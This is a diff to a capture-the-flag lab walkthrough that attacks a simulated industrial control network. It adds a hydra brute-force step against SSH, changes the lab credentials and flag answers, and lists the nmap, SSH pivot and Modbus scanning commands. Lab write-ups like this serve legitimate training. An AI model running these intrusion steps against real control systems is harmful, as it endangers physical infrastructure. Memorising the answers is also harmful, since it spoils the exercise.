@@ -92,18 +92,23 @@ Once the attacker reaches the high-privilege EWS, they do not hack the PLC opera
 **Answer:** `FLAG{IDMZ_JUMP_ACCESSED}`
 
 ### Steps:
-1. Open a terminal on Kali.
-2. Scan the IDMZ subnet (`192.168.50.0/24`) to target open ports for SSH services:
+1. Open a terminal on the Kali attacker workstation.
+2. Scan the IDMZ subnet (`192.168.50.0/24`) using `nmap` to locate the active jump host running SSH:
    ```bash
    nmap -p 22 --open 192.168.50.0/24
    ```
 3. Locate the active jump host IP: **`192.168.50.50`**.
-4. Log into the jump host via SSH using the default credentials:
+4. You know that the user `operator` has a weak password. Run a dictionary attack using **hydra** and the pre-deployed `/home/debian/passlist.txt` file:
+   ```bash
+   hydra -l operator -P passlist.txt ssh://192.168.50.50
+   ```
+   *Output reveals cracked password:* `operator123`
+5. Connect via SSH using the cracked credentials:
    ```bash
    ssh operator@192.168.50.50
    ```
    *(When prompted for password, enter: `operator123`)*
-5. Read the flag file in the home directory to retrieve the passkey:
+6. Read the flag file in the operator's home directory to retrieve the passkey:
    ```bash
    cat flag.txt
    ```
@@ -153,7 +158,7 @@ Once the attacker reaches the high-privilege EWS, they do not hack the PLC opera
 
 **Objective:** Search the compromised HMI filesystem to locate and extract EWS administrative credentials from `/home/debian/ews_credentials.txt`.
 
-**Answer:** `operator123`
+**Answer:** `EngineeringPass2026!`
 
 ### Steps:
 1. Double-click the existing Node-RED `exec` node on your browser dashboard.
@@ -164,9 +169,9 @@ Once the attacker reaches the high-privilege EWS, they do not hack the PLC opera
 3. Click **Deploy** and click the inject trigger button.
 4. The debug output contains:
    * **Host:** `192.168.20.20`
-   * **User:** `operator`
-   * **Password:** `operator123`
-5. Submit the operator password: **`operator123`**.
+   * **User:** `engineer`
+   * **Password:** `EngineeringPass2026!`
+5. Submit the engineer password: **`EngineeringPass2026!`**.
 
 ---
 
@@ -203,12 +208,12 @@ Your prompt will update to `root@scada-hmi:~#`.
 #### Step 4 — SSH Pivot to the EWS
 From the SCADA HMI terminal, SSH into the Engineering Workstation using the stolen credentials:
 ```bash
-ssh operator@192.168.20.20
+ssh engineer@192.168.20.20
 ```
-*(Enter password `operator123` when prompted)*
+*(Enter password `EngineeringPass2026!` when prompted)*
 
 #### Step 5 — Scan the Control Subnet
-From the EWS command line (`operator@engineering-station`), scan the control network to target active PLCs speaking Modbus (port 502):
+From the EWS command line (`engineer@engineering-station`), scan the control network to target active PLCs speaking Modbus (port 502):
 ```bash
 nmap -p 502 --open 192.168.20.0/24
 ```
